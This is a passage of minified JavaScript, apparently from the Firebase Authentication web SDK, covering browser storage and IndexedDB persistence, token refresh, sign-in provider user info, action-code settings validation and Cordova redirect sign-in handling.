          return a && (a.setItem(b, "1"), a.removeItem(b)), a;
        } catch (c) {
          return null;
        }
      },
      ap = function () {
        var a = "Node" == ol();
        if (
          !(a =
            bp() ||
            (a &&
              firebase.INTERNAL.node &&
              firebase.INTERNAL.node.localStorage))
        )
          return !1;
        try {
          return a.setItem("__sak", "1"), a.removeItem("__sak"), !0;
        } catch (b) {
          return !1;
        }
      };
    (k = cp.prototype),
      (k.get = function (a) {
        var b = this;
        return F().then(function () {
          var c = b.tb.getItem(a);
          return Al(c);
        });
      }),
      (k.set = function (a, b) {
        var c = this;
        return F().then(function () {
          var d = yl(b);
          null === d ? c.remove(a) : c.tb.setItem(a, d);
        });
      }),
      (k.remove = function (a) {
        var b = this;
        return F().then(function () {
          b.tb.removeItem(a);
        });
      }),
      (k.mc = function (a) {
        p.window && nj(p.window, "storage", a);
      }),
      (k.zc = function (a) {
        p.window && vj(p.window, "storage", a);
      });
    var dp = function () {
      (this.tb = {}), (this.type = "nullStorage");
    };
    (k = dp.prototype),
      (k.get = function () {
        return F(null);
      }),
      (k.set = function () {
        return F();
      }),
      (k.remove = function () {
        return F();
      }),
      (k.mc = function () {}),
      (k.zc = function () {});
    var gp = function () {
        if (!ep()) {
          if ("Node" == ol())
            throw new P(
              "internal-error",
              "The SessionStorage compatibility library was not found."
            );
          throw new P("web-storage-unsupported");
        }
        (this.tb = fp() || firebase.INTERNAL.node.sessionStorage),
          (this.type = "sessionStorage");
      },
      fp = function () {
        try {
          var a = p.sessionStorage,
            b = tl();
          return a && (a.setItem(b, "1"), a.removeItem(b)), a;
        } catch (c) {
          return null;
        }
      },
      ep = function () {
        var a = "Node" == ol();
        if (
          !(a =
            fp() ||
            (a &&
              firebase.INTERNAL.node &&
              firebase.INTERNAL.node.sessionStorage))
        )
          return !1;
        try {
          return a.setItem("__sak", "1"), a.removeItem("__sak"), !0;
        } catch (b) {
          return !1;
        }
      };
    (k = gp.prototype),
      (k.get = function (a) {
        var b = this;
        return F().then(function () {
          var c = b.tb.getItem(a);
          return Al(c);
        });
      }),
      (k.set = function (a, b) {
        var c = this;
        return F().then(function () {
          var d = yl(b);
          null === d ? c.remove(a) : c.tb.setItem(a, d);
        });
      }),
      (k.remove = function (a) {
        var b = this;
        return F().then(function () {
          b.tb.removeItem(a);
        });
      }),
      (k.mc = function () {}),
      (k.zc = function () {});
    var jp = function () {
        if (!hp()) throw new P("web-storage-unsupported");
        (this.hi = "firebaseLocalStorageDb"),
          (this.xf = "firebaseLocalStorage"),
          (this.wg = "fbase_key"),
          (this.Yj = "value"),
          (this.ym = 1),
          (this.Ra = {}),
          (this.Ub = []),
          (this.me = 0),
          (this.Li = p.indexedDB),
          (this.type = "indexedDB"),
          (this.Nf = this.uc = this.Ef = this.hh = null),
          (this.Ej = !1),
          (this.ag = null);
        var a = this;
        nl() && self
          ? ((this.uc = Yo(nl() ? self : null)),
            this.uc.subscribe("keyChanged", function (b, c) {
              return ip(a).then(function (d) {
                return (
                  0 < d.length &&
                    x(a.Ub, function (e) {
                      e(d);
                    }),
                  { keyProcessed: Qa(d, c.key) }
                );
              });
            }),
            this.uc.subscribe("ping", function () {
              return F(["keyChanged"]);
            }))
          : Kl().then(function (b) {
              (a.ag = b) &&
                ((a.Nf = new Uo(new To(b))),
                a.Nf.send("ping", null, !0)
                  .then(function (c) {
                    c[0].fulfilled &&
                      Qa(c[0].value, "keyChanged") &&
                      (a.Ej = !0);
                  })
                  .l(function () {}));
            });
      },
      kp,
      lp = function (a) {
        return new E(function (b, c) {
          var d = a.Li.deleteDatabase(a.hi);
          (d.onsuccess = function () {
            b();
          }),
            (d.onerror = function (e) {
              c(Error(e.target.error));
            });
        });
      },
      mp = function (a) {
        return new E(function (b, c) {
          var d = a.Li.open(a.hi, a.ym);
          (d.onerror = function (e) {
            try {
              e.preventDefault();
            } catch (f) {}
            c(Error(e.target.error));
          }),
            (d.onupgradeneeded = function (e) {
              e = e.target.result;
              try {
                e.createObjectStore(a.xf, { keyPath: a.wg });
              } catch (f) {
                c(f);
              }
            }),
            (d.onsuccess = function (e) {
              (e = e.target.result).objectStoreNames.contains(a.xf)
                ? b(e)
                : lp(a)
                    .then(function () {
                      return mp(a);
                    })
                    .then(function (f) {
                      b(f);
                    })
                    .l(function (f) {
                      c(f);
                    });
            });
        });
      },
      np = function (a) {
        return a.Ng || (a.Ng = mp(a)), a.Ng;
      },
      op = function (a, b) {
        var c = 0,
          d = function (e, f) {
            np(a)
              .then(b)
              .then(e)
              .l(function (g) {
                if (!(3 < ++c))
                  return np(a)
                    .then(function (h) {
                      return h.close(), (a.Ng = void 0), d(e, f);
                    })
                    .l(function (h) {
                      f(h);
                    });
                f(g);
              });
          };
        return new E(d);
      },
      hp = function () {
        try {
          return !!p.indexedDB;
        } catch (a) {
          return !1;
        }
      },
      pp = function (a, b) {
        return b.objectStore(a.xf);
      },
      qp = function (a, b, c) {
        return b.transaction([a.xf], c ? "readwrite" : "readonly");
      },
      rp = function (a) {
        return new E(function (b, c) {
          (a.onsuccess = function (d) {
            d && d.target ? b(d.target.result) : b();
          }),
            (a.onerror = function (d) {
              c(d.target.error);
            });
        });
      };
    jp.prototype.set = function (a, b) {
      var c = this,
        d = !1;
      return op(this, function (e) {
        return (e = pp(c, qp(c, e, !0))), rp(e.get(a));
      })
        .then(function (e) {
          return op(c, function (f) {
            if (((f = pp(c, qp(c, f, !0))), e))
              return (e.value = b), rp(f.put(e));
            c.me++, (d = !0);
            var g = {};
            return (g[c.wg] = a), (g[c.Yj] = b), rp(f.add(g));
          });
        })
        .then(function () {
          return (c.Ra[a] = b), sp(c, a);
        })
        .Ac(function () {
          d && c.me--;
        });
    };
    var sp = function (a, b) {
      return a.Nf && a.ag && Jl() === a.ag
        ? a.Nf.send("keyChanged", { key: b }, a.Ej)
            .then(function () {})
            .l(function () {})
        : F();
    };
    (jp.prototype.get = function (a) {
      var b = this;
      return op(this, function (c) {
        return rp(pp(b, qp(b, c, !1)).get(a));
      }).then(function (c) {
        return c && c.value;
      });
    }),
      (jp.prototype.remove = function (a) {
        var b = !1,
          c = this;
        return op(this, function (d) {
          return (b = !0), c.me++, rp(pp(c, qp(c, d, !0)).delete(a));
        })
          .then(function () {
            return delete c.Ra[a], sp(c, a);
          })
          .Ac(function () {
            b && c.me--;
          });
      });
    var ip = function (a) {
      return np(a)
        .then(function (b) {
          var c = pp(a, qp(a, b, !1));
          return c.getAll
            ? rp(c.getAll())
            : new E(function (d, e) {
                var f = [],
                  g = c.openCursor();
                (g.onsuccess = function (h) {
                  (h = h.target.result)
                    ? (f.push(h.value), h.continue())
                    : d(f);
                }),
                  (g.onerror = function (h) {
                    e(h.target.error);
                  });
              });
        })
        .then(function (b) {
          var c = {},
            d = [];
          if (0 == a.me) {
            for (d = 0; d < b.length; d++) c[b[d][a.wg]] = b[d][a.Yj];
            (d = Zk(a.Ra, c)), (a.Ra = c);
          }
          return d;
        });
    };
    function tp(a) {
      var b = this,
        c = null;
      (this.Ub = []),
        (this.type = "indexedDB"),
        (this.mi = a),
        (this.Nh = F()
          .then(function () {
            if (hp()) {
              var d = tl(),
                e = "__sak" + d;
              return (
                kp || (kp = new jp()),
                (c = kp)
                  .set(e, d)
                  .then(function () {
                    return c.get(e);
                  })
                  .then(function (f) {
                    if (f !== d) throw Error("indexedDB not supported!");
                    return c.remove(e);
                  })
                  .then(function () {
                    return c;
                  })
                  .l(function () {
                    return b.mi;
                  })
              );
            }
            return b.mi;
          })
          .then(function (d) {
            return (
              (b.type = d.type),
              d.mc(function (e) {
                x(b.Ub, function (f) {
                  f(e);
                });
              }),
              d
            );
          }));
    }
    (jp.prototype.mc = function (a) {
      0 == this.Ub.length && this.Hh(), this.Ub.push(a);
    }),
      (jp.prototype.zc = function (a) {
        Ta(this.Ub, function (b) {
          return b == a;
        }),
          0 == this.Ub.length && this.Qf();
      }),
      (jp.prototype.Hh = function () {
        var a = this;
        this.Qf();
        var b = function () {
          a.Ef = setTimeout(function () {
            a.hh = ip(a)
              .then(function (c) {
                0 < c.length &&
                  x(a.Ub, function (d) {
                    d(c);
                  });
              })
              .then(function () {
                b();
              })
              .l(function (c) {
                "STOP_EVENT" != c.message && b();
              });
          }, 800);
        };
        b();
      }),
      (jp.prototype.Qf = function () {
        this.hh && this.hh.cancel("STOP_EVENT"),
          this.Ef && (clearTimeout(this.Ef), (this.Ef = null));
      }),
      (k = tp.prototype),
      (k.get = function (a) {
        return this.Nh.then(function (b) {
          return b.get(a);
        });
      }),
      (k.set = function (a, b) {
        return this.Nh.then(function (c) {
          return c.set(a, b);
        });
      }),
      (k.remove = function (a) {
        return this.Nh.then(function (b) {
          return b.remove(a);
        });
      }),
      (k.mc = function (a) {
        this.Ub.push(a);
      }),
      (k.zc = function (a) {
        Ta(this.Ub, function (b) {
          return b == a;
        });
      });
    var yp = function () {
        this.zg = { Browser: up, Node: vp, ReactNative: wp, Worker: xp }[ol()];
      },
      zp,
      up = { ua: cp, Rf: gp },
      vp = { ua: cp, Rf: gp },
      wp = { ua: Zo, Rf: dp },
      xp = { ua: cp, Rf: dp },
      Ap = function () {
        (this.fg = !1),
          Object.defineProperty(this, "appVerificationDisabled", {
            get: function () {
              return this.fg;
            },
            set: function (a) {
              this.fg = a;
            },
            enumerable: !1,
          });
      },
      Bp = function (a) {
        this.Pg(a);
      };
    Bp.prototype.Pg = function (a) {
      var b = a.url;
      if (void 0 === b) throw new P("missing-continue-uri");
      if ("string" != typeof b || ("string" == typeof b && !b.length))
        throw new P("invalid-continue-uri");
      (this.uk = b), (this.Qh = this.eg = null), (this.Ni = !1);
      var c = a.android;
      if (c && "object" == typeof c) {
        b = c.packageName;
        var d = c.installApp;
        if (((c = c.minimumVersion), "string" == typeof b && b.length)) {
          if (((this.eg = b), void 0 !== d && "boolean" != typeof d))
            throw new P(
              "argument-error",
              "installApp property must be a boolean when specified."
            );
          if (
            ((this.Ni = !!d),
            void 0 !== c &&
              ("string" != typeof c || ("string" == typeof c && !c.length)))
          )
            throw new P(
              "argument-error",
              "minimumVersion property must be a non empty string when specified."
            );
          this.Qh = c || null;
        } else {
          if (void 0 !== b)
            throw new P(
              "argument-error",
              "packageName property must be a non empty string when specified."
            );
          if (void 0 !== d || void 0 !== c)
            throw new P("missing-android-pkg-name");
        }
      } else if (void 0 !== c)
        throw new P(
          "argument-error",
          "android property must be a non null object when specified."
        );
      if (((this.Hi = null), (b = a.iOS) && "object" == typeof b)) {
        if ("string" == typeof (b = b.bundleId) && b.length) this.Hi = b;
        else if (void 0 !== b)
          throw new P(
            "argument-error",
            "bundleId property must be a non empty string when specified."
          );
      } else if (void 0 !== b)
        throw new P(
          "argument-error",
          "iOS property must be a non null object when specified."
        );
      if (void 0 !== (b = a.handleCodeInApp) && "boolean" != typeof b)
        throw new P(
          "argument-error",
          "handleCodeInApp property must be a boolean when specified."
        );
      if (
        ((this.Xh = !!b),
        void 0 !== (a = a.dynamicLinkDomain) &&
          ("string" != typeof a || ("string" == typeof a && !a.length)))
      )
        throw new P(
          "argument-error",
          "dynamicLinkDomain property must be a non empty string when specified."
        );
      this.Ck = a || null;
    };
    var Cp = function (a) {
        var b = {};
        for (var c in ((b.continueUrl = a.uk),
        (b.canHandleCodeInApp = a.Xh),
        (b.androidPackageName = a.eg) &&
          ((b.androidMinimumVersion = a.Qh), (b.androidInstallApp = a.Ni)),
        (b.iOSBundleId = a.Hi),
        (b.dynamicLinkDomain = a.Ck),
        b))
          null === b[c] && delete b[c];
        return b;
      },
      Dp = function (a, b) {
        (this.yk = b), O(this, "verificationId", a);
      };
    Dp.prototype.confirm = function (a) {
      return (a = an(this.verificationId, a)), this.yk(a);
    };
    var Ep = function (a, b, c, d) {
        return new Xm(a).verifyPhoneNumber(b, c).then(function (e) {
          return new Dp(e, d);
        });
      },
      Fp = function (a, b, c) {
        if (
          ((this.Kl = a),
          (this.em = b),
          (this.Qk = c),
          (this.uf = 3e4),
          (this.Ph = 96e4),
          (this.fm = !1),
          (this.xd = null),
          (this.Pc = this.uf),
          this.Ph < this.uf)
        )
          throw Error(
            "Proactive refresh lower bound greater than upper bound!"
          );
      };
    Fp.prototype.start = function () {
      (this.Pc = this.uf), Gp(this, !0);
    };
    var Hp = function (a, b) {
        return b
          ? ((a.Pc = a.uf), a.Qk())
          : ((b = a.Pc), (a.Pc *= 2), a.Pc > a.Ph && (a.Pc = a.Ph), b);
      },
      Gp = function (a, b) {
        a.stop(),
          (a.xd = ik(Hp(a, b))
            .then(function () {
              return a.fm ? F() : Fl();
            })
            .then(function () {
              return a.Kl();
            })
            .then(function () {
              Gp(a, !0);
            })
            .l(function (c) {
              a.em(c) && Gp(a, !1);
            }));
      };
    Fp.prototype.stop = function () {
      this.xd && (this.xd.cancel(), (this.xd = null));
    };
    var Op = function (a) {
        var b = {};
        (b["facebook.com"] = Ip),
          (b["google.com"] = Jp),
          (b["github.com"] = Kp),
          (b["twitter.com"] = Lp);
        var c = a && a.providerId;
        try {
          if (c) return b[c] ? new b[c](a) : new Mp(a);
          if (void 0 !== a.idToken) return new Np(a);
        } catch (d) {}
        return null;
      },
      Np = function (a) {
        var b = a.providerId;
        if (!b && a.idToken) {
          var c = mm(a.idToken);
          c && c.mh && (b = c.mh);
        }
        if (!b) throw Error("Invalid additional user info!");
        ("anonymous" != b && "custom" != b) || (b = null),
          (c = !1),
          void 0 !== a.isNewUser
            ? (c = !!a.isNewUser)
            : "identitytoolkit#SignupNewUserResponse" === a.kind && (c = !0),
          O(this, "providerId", b),
          O(this, "isNewUser", c);
      },
      Mp = function (a) {
        Np.call(this, a),
          (a = Al(a.rawUserInfo || "{}")),
          O(this, "profile", Sl(a || {}));
      };
    n(Mp, Np);
    var Ip = function (a) {
      if ((Mp.call(this, a), "facebook.com" != this.providerId))
        throw Error("Invalid provider ID!");
    };
    n(Ip, Mp);
    var Kp = function (a) {
      if ((Mp.call(this, a), "github.com" != this.providerId))
        throw Error("Invalid provider ID!");
      O(this, "username", (this.profile && this.profile.login) || null);
    };
    n(Kp, Mp);
    var Jp = function (a) {
      if ((Mp.call(this, a), "google.com" != this.providerId))
        throw Error("Invalid provider ID!");
    };
    n(Jp, Mp);
    var Lp = function (a) {
      if ((Mp.call(this, a), "twitter.com" != this.providerId))
        throw Error("Invalid provider ID!");
      O(this, "username", a.screenName || null);
    };
    n(Lp, Mp);
    var Pp = { LOCAL: "local", NONE: "none", SESSION: "session" },
      Qp = function (a) {
        var b = new P("invalid-persistence-type"),
          c = new P("unsupported-persistence-type");
        a: {
          for (d in Pp)
            if (Pp[d] == a) {
              var d = !0;
              break a;
            }
          d = !1;
        }
        if (!d || "string" != typeof a) throw b;
        switch (ol()) {
          case "ReactNative":
            if ("session" === a) throw c;
            break;
          case "Node":
            if ("none" !== a) throw c;
            break;
          case "Worker":
            if ("session" === a || (!hp() && "none" !== a)) throw c;
            break;
          default:
            if (!ul() && "none" !== a) throw c;
        }
      },
      Rp = function () {
        var a = !(Bl(Vk()) || !ml()),
          b = xl(),
          c = ul();
        (this.aj = "firebase"),
          (this.yh = ":"),
          (this.hm = a),
          (this.Aj = b),
          (this.Zj = c),
          (this.Za = {}),
          zp || (zp = new yp()),
          (a = zp);
        try {
          this.qj =
            (!Wk() && Il()) || !p.indexedDB
              ? new a.zg.ua()
              : new tp(nl() ? new $o() : new a.zg.ua());
        } catch (d) {
          (this.qj = new $o()), (this.Aj = !0);
        }
        try {
          this.Rj = new a.zg.Rf();
        } catch (d) {
          this.Rj = new $o();
        }
        (this.ll = new $o()), (this.Jh = u(this.Oj, this)), (this.Ra = {});
      },
      Sp,
      Tp = function () {
        return Sp || (Sp = new Rp()), Sp;
      },
      Up = function (a, b) {
        switch (b) {
          case "session":
            return a.Rj;
          case "none":
            return a.ll;
          default:
            return a.qj;
        }
      };
    Rp.prototype.nb = function (a, b) {
      return this.aj + this.yh + a.name + (b ? this.yh + b : "");
    };
    var Vp = function (a, b, c) {
      var d = a.nb(b, c),
        e = Up(a, b.ua);
      return a.get(b, c).then(function (f) {
        var g = null;
        try {
          g = Al(p.localStorage.getItem(d));
        } catch (h) {}
        if (g && !f) return p.localStorage.removeItem(d), a.set(b, g, c);
        g && f && "localStorage" != e.type && p.localStorage.removeItem(d);
      });
    };
    (k = Rp.prototype),
      (k.get = function (a, b) {
        return Up(this, a.ua).get(this.nb(a, b));
      }),
      (k.remove = function (a, b) {
        return (
          (b = this.nb(a, b)),
          "local" == a.ua && (this.Ra[b] = null),
          Up(this, a.ua).remove(b)
        );
      }),
      (k.set = function (a, b, c) {
        var d = this.nb(a, c),
          e = this,
          f = Up(this, a.ua);
        return f
          .set(d, b)
          .then(function () {
            return f.get(d);
          })
          .then(function (g) {
            "local" == a.ua && (e.Ra[d] = g);
          });
      }),
      (k.addListener = function (a, b, c) {
        (a = this.nb(a, b)),
          this.Zj && (this.Ra[a] = p.localStorage.getItem(a)),
          Ya(this.Za) && this.Hh(),
          this.Za[a] || (this.Za[a] = []),
          this.Za[a].push(c);
      }),
      (k.removeListener = function (a, b, c) {
        (a = this.nb(a, b)),
          this.Za[a] &&
            (Ta(this.Za[a], function (d) {
              return d == c;
            }),
            0 == this.Za[a].length && delete this.Za[a]),
          Ya(this.Za) && this.Qf();
      }),
      (k.Hh = function () {
        Up(this, "local").mc(this.Jh),
          this.Aj || ((Wk() || !Il()) && p.indexedDB) || !this.Zj || Wp(this);
      });
    var Wp = function (a) {
        Xp(a),
          (a.Ug = setInterval(function () {
            for (var b in a.Za) {
              var c = p.localStorage.getItem(b),
                d = a.Ra[b];
              c != d &&
                ((a.Ra[b] = c),
                (c = new aj({
                  type: "storage",
                  key: b,
                  target: window,
                  oldValue: d,
                  newValue: c,
                  fh: !0,
                })),
                a.Oj(c));
            }
          }, 1e3));
      },
      Xp = function (a) {
        a.Ug && (clearInterval(a.Ug), (a.Ug = null));
      };
    (Rp.prototype.Qf = function () {
      Up(this, "local").zc(this.Jh), Xp(this);
    }),
      (Rp.prototype.Oj = function (a) {
        if (a && a.Mk) {
          var b = a.Ya.key;
          if (null == b)
            for (var c in this.Za) {
              var d = this.Ra[c];
              void 0 === d && (d = null);
              var e = p.localStorage.getItem(c);
              e !== d && ((this.Ra[c] = e), this.og(c));
            }
          else if (0 == b.indexOf(this.aj + this.yh) && this.Za[b]) {
            if (
              (void 0 !== a.Ya.fh ? Up(this, "local").zc(this.Jh) : Xp(this),
              this.hm)
            )
              if (((c = p.localStorage.getItem(b)), (d = a.Ya.newValue) !== c))
                null !== d
                  ? p.localStorage.setItem(b, d)
                  : p.localStorage.removeItem(b);
              else if (this.Ra[b] === d && void 0 === a.Ya.fh) return;
            var f = this;
            (c = function () {
              (void 0 === a.Ya.fh && f.Ra[b] === p.localStorage.getItem(b)) ||
                ((f.Ra[b] = p.localStorage.getItem(b)), f.og(b));
            }),
              sc &&
              Hc &&
              10 == Hc &&
              p.localStorage.getItem(b) !== a.Ya.newValue &&
              a.Ya.newValue !== a.Ya.oldValue
                ? setTimeout(c, 10)
                : c();
          }
        } else x(a, u(this.og, this));
      }),
      (Rp.prototype.og = function (a) {
        this.Za[a] &&
          x(this.Za[a], function (b) {
            b();
          });
      });
    var Yp = function (a) {
        (this.V = a), (this.O = Tp());
      },
      $p = function (a) {
        return a.O.get(Zp, a.V).then(function (b) {
          return $l(b);
        });
      },
      aq = function (a) {
        return a.O.remove(Zp, a.V);
      };
    (Yp.prototype.Cc = function (a) {
      this.O.addListener(Zp, this.V, a);
    }),
      (Yp.prototype.Ed = function (a) {
        this.O.removeListener(Zp, this.V, a);
      });
    var cq = function (a) {
        return a.O.get(bq, a.V).then(function (b) {
          return $l(b);
        });
      },
      Zp = { name: "authEvent", ua: "local" },
      bq = { name: "redirectEvent", ua: "session" },
      dq = function () {
        this.O = Tp();
      };
    dq.prototype.ae = function () {
      return this.O.get(eq, void 0);
    };
    var eq = { name: "sessionId", ua: "session" },
      fq = function () {
        (this.Vg = null), (this.Qe = []);
      };
    (fq.prototype.subscribe = function (a) {
      var b = this;
      this.Qe.push(a),
        this.Vg ||
          ((this.Vg = function (c) {
            for (var d = 0; d < b.Qe.length; d++) b.Qe[d](c);
          }),
          "function" == typeof (a = N("universalLinks.subscribe", p)) &&
            a(null, this.Vg));
    }),
      (fq.prototype.unsubscribe = function (a) {
        Ta(this.Qe, function (b) {
          return b == a;
        });
      });
    var gq = null,
      hq = function (a, b, c, d, e, f) {
        (this.ya = a),
          (this.ha = b),
          (this.ka = c),
          (this.N = f),
          (this.Ec = d || null),
          (this.Ia = e || null),
          (this.Pj = b + ":" + c),
          (this.im = new dq()),
          (this.xi = new Yp(this.Pj)),
          (this.Og = null),
          (this.Vb = []),
          (this.ql = 500),
          (this.Rl = 2e3),
          (this.ee = this.Df = null);
      },
      iq = function (a) {
        return new P("invalid-cordova-configuration", a);
      };
    hq.prototype.Nc = function () {
      return this.fe
        ? this.fe
        : (this.fe = kl().then(
            function () {
              if ("function" != typeof N("universalLinks.subscribe", p))
                throw iq("cordova-universal-links-plugin-fix is not installed");
              if (void 0 === N("BuildInfo.packageName", p))
                throw iq("cordova-plugin-buildinfo is not installed");
              if (
                "function" != typeof N("cordova.plugins.browsertab.openUrl", p)
              )
                throw iq("cordova-plugin-browsertab is not installed");
              if ("function" != typeof N("cordova.InAppBrowser.open", p))
                throw iq("cordova-plugin-inappbrowser is not installed");
            },
            function () {
              throw new P("cordova-not-ready");
            }
          ));
    };
    var jq = function () {
        for (var a = 20, b = []; 0 < a; )
          b.push(
            "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".charAt(
              Math.floor(62 * Math.random())
            )
          ),
            a--;
        return b.join("");
      },
      kq = function (a) {
        var b = new Xi();
        return b.update(a), Ki(b.digest());
      };
    (k = hq.prototype),
      (k.Ae = function (a, b) {
        return b(new P("operation-not-supported-in-this-environment")), F();
      }),
      (k.qe = function () {
        return G(new P("operation-not-supported-in-this-environment"));
      }),
      (k.Sj = function () {
        return !1;
      }),
      (k.Mj = function () {
        return !0;
      }),
      (k.Ei = function () {
        return !0;
      }),
      (k.re = function (a, b, c, d) {
        if (this.Df) return G(new P("redirect-operation-pending"));
        var e = this,
          f = p.document,
          g = null,
          h = null,
          l = null,
          m = null;
        return (this.Df = F()
          .then(function () {
            return cn(b), lq(e);
          })
          .then(function () {
            return mq(e, a, b, c, d);
          })
          .then(function () {
            return new E(function (q, y) {
              (h = function () {
                var B = N("cordova.plugins.browsertab.close", p);
                return (
                  q(),
                  "function" == typeof B && B(),
                  e.ee &&
                    "function" == typeof e.ee.close &&
                    (e.ee.close(), (e.ee = null)),
                  !1
                );
              }),
                e.Cc(h),
                (l = function () {
                  g ||
                    (g = ik(e.Rl).then(function () {
                      y(new P("redirect-cancelled-by-user"));
                    }));
                }),
                (m = function () {
                  El() && l();
                }),
                f.addEventListener("resume", l, !1),
                Vk()
                  .toLowerCase()
                  .match(/android/) ||
                  f.addEventListener("visibilitychange", m, !1);
            }).l(function (q) {
              return nq(e).then(function () {
                throw q;
              });
            });
          })
          .Ac(function () {
            l && f.removeEventListener("resume", l, !1),
              m && f.removeEventListener("visibilitychange", m, !1),
              g && g.cancel(),
              h && e.Ed(h),
              (e.Df = null);
          }));
      });
    var mq = function (a, b, c, d, e) {
      var f = jq(),
        g = new Zl(b, d, null, f, new P("no-auth-event"), null, e),
        h = N("BuildInfo.packageName", p);
      if ("string" != typeof h) throw new P("invalid-cordova-configuration");
      var l = N("BuildInfo.displayName", p),
        m = {};
      if (
        Vk()
          .toLowerCase()
          .match(/iphone|ipad|ipod/)
      )
        m.ibi = h;
      else {
        if (
          !Vk()
            .toLowerCase()
            .match(/android/)
        )
          return G(new P("operation-not-supported-in-this-environment"));
        m.apn = h;
      }
      l && (m.appDisplayName = l), (f = kq(f)), (m.sessionId = f);
      var q = Bo(a.ya, a.ha, a.ka, b, c, null, d, a.Ec, m, a.Ia, e, a.N);
      return a
        .Nc()
        .then(function () {
          var y = a.Pj;
          return a.im.O.set(Zp, g.T(), y);
        })
        .then(function () {
          var y = N("cordova.plugins.browsertab.isAvailable", p);
          if ("function" != typeof y)
            throw new P("invalid-cordova-configuration");
          var B = null;
          y(function (S) {
            if (S) {
              if (
                "function" !=
                typeof (B = N("cordova.plugins.browsertab.openUrl", p))
              )
                throw new P("invalid-cordova-configuration");
              B(q);
            } else {
              if ("function" != typeof (B = N("cordova.InAppBrowser.open", p)))
                throw new P("invalid-cordova-configuration");
              S = B;
              var Ba = Vk();
              (Ba = !(
                !Ba.match(/(iPad|iPhone|iPod).*OS 7_\d/i) &&
                !Ba.match(/(iPad|iPhone|iPod).*OS 8_\d/i)
              )),
                (a.ee = S(q, Ba ? "_blank" : "_system", "location=yes"));
            }
          });
        });
    };
    hq.prototype.Ud = function (a) {
      for (var b = 0; b < this.Vb.length; b++)
        try {
          this.Vb[b](a);
        } catch (c) {}
    };
    var lq = function (a) {
        return (
          a.Og ||
            (a.Og = a.Nc().then(function () {
              return new E(function (b) {
                var c = function (d) {
                  return b(d), a.Ed(c), !1;
                };
                a.Cc(c), oq(a);
              });
            })),
          a.Og
        );
      },
      nq = function (a) {
        var b = null;
        return $p(a.xi)
          .then(function (c) {
            return (b = c), aq(a.xi);
          })
          .then(function () {
            return b;
          });
      },
      oq = function (a) {
        var b = new Zl("unknown", null, null, null, new P("no-auth-event")),
          c = !1,
          d = ik(a.ql).then(function () {
            return nq(a).then(function () {
              c || a.Ud(b);
            });
          }),
          e = function (g) {
            (c = !0),
              d && d.cancel(),
              nq(a).then(function (h) {
                var l = b;
                if (h && g && g.url) {
                  var m = null;
                  -1 != (l = im(g.url)).indexOf("/__/auth/callback") &&
                    ((m = M(l)),
                    (m = (m =
                      "object" ==
                      typeof (m = Al(Mk(m, "firebaseError") || null))
                        ? Yl(m)
                        : null)
                      ? new Zl(h.getType(), h.Ja, null, null, m, null, h.ma)
                      : new Zl(
                          h.getType(),
                          h.Ja,
                          l,
                          h.ae(),
                          null,
                          null,
                          h.ma
                        ))),
                    (l = m || b);
                }
                a.Ud(l);
              });
          },
          f = p.handleOpenURL;
        (p.handleOpenURL = function (g) {
          if (
            (0 ==
              g
                .toLowerCase()
                .indexOf(N("BuildInfo.packageName", p).toLowerCase() + "://") &&
              e({ url: g }),
            "function" == typeof f)
          )
            try {
              f(g);
            } catch (h) {
              console.error(h);
            }
        }),
          gq || (gq = new fq()),
          gq.subscribe(e);
      };
    (hq.prototype.Cc = function (a) {
      this.Vb.push(a),
        lq(this).l(function (b) {
          "auth/invalid-cordova-configuration" === b.code &&
            ((b = new Zl("unknown", null, null, null, new P("no-auth-event"))),
            a(b));
        });
    }),
      (hq.prototype.Ed = function (a) {
        Ta(this.Vb, function (b) {
          return b == a;
        });
      });
    var pq = function (a) {
        (this.V = a), (this.O = Tp());
      },
      rq = function (a) {
        return a.O.set(qq, "pending", a.V);
      },
      sq = function (a) {
        return a.O.remove(qq, a.V);
      },
      tq = function (a) {
        return a.O.get(qq, a.V).then(function (b) {
          return "pending" == b;
        });
      },
      qq = { name: "pendingRedirect", ua: "session" },
      yq = function (a, b, c, d) {
        (this.Ff = {}),
          (this.Tg = 0),
          (this.ya = a),
          (this.ha = b),
          (this.ka = c),
          (this.N = d),
          (this.Ce = []),
          (this.td = !1),
          (this.jg = u(this.Ig, this)),
          (this.vc = new uq(this)),
          (this.ih = new vq(this)),
          (this.ne = new pq(wq(this.ha, this.ka))),
          (this.Bc = {}),
          (this.Bc.unknown = this.vc),
          (this.Bc.signInViaRedirect = this.vc),
          (this.Bc.linkViaRedirect = this.vc),
          (this.Bc.reauthViaRedirect = this.vc),
          (this.Bc.signInViaPopup = this.ih),
          (this.Bc.linkViaPopup = this.ih),
          (this.Bc.reauthViaPopup = this.ih),
          (this.qb = xq(this.ya, this.ha, this.ka, Uk, this.N));
      },
      xq = function (a, b, c, d, e) {
        var f = firebase.SDK_VERSION || null;
        return jl() ? new hq(a, b, c, f, d, e) : new xo(a, b, c, f, d, e);
      };
    (yq.prototype.reset = function () {
      (this.td = !1),
        this.qb.Ed(this.jg),
        (this.qb = xq(this.ya, this.ha, this.ka, null, this.N)),
        (this.Ff = {});
    }),
      (yq.prototype.ad = function () {
        this.vc.ad();
      }),
      (yq.prototype.initialize = function () {
        var a = this;
        this.td || ((this.td = !0), this.qb.Cc(this.jg));
        var b = this.qb;
        return this.qb.Nc().l(function (c) {
          throw (a.qb == b && a.reset(), c);
        });
      });
    var Bq = function (a) {
      a.qb.Mj() &&
        a.initialize().l(function (b) {
          var c = new Zl(
            "unknown",
            null,
            null,
            null,
            new P("operation-not-supported-in-this-environment")
          );
          zq(b) && a.Ig(c);
        }),
        a.qb.Ei() || Aq(a.vc);
    };
    (k = yq.prototype),
      (k.subscribe = function (a) {
        if ((Qa(this.Ce, a) || this.Ce.push(a), !this.td)) {
          var b = this;
          tq(this.ne)
            .then(function (c) {
              c
                ? sq(b.ne).then(function () {
                    b.initialize().l(function (d) {
                      var e = new Zl(
                        "unknown",
                        null,
                        null,
                        null,
                        new P("operation-not-supported-in-this-environment")
                      );
                      zq(d) && b.Ig(e);
                    });
                  })
                : Bq(b);
            })
            .l(function () {
              Bq(b);
            });
        }
      }),
      (k.unsubscribe = function (a) {
        Ta(this.Ce, function (b) {
          return b == a;
        });
      }),
      (k.Ig = function (a) {
        if (!a) throw new P("invalid-auth-event");
        if (
          (6e5 <= Date.now() - this.Tg && ((this.Ff = {}), (this.Tg = 0)),
          a && a.getUid() && this.Ff.hasOwnProperty(a.getUid()))
        )
          return !1;
        for (var b = !1, c = 0; c < this.Ce.length; c++) {
          var d = this.Ce[c];
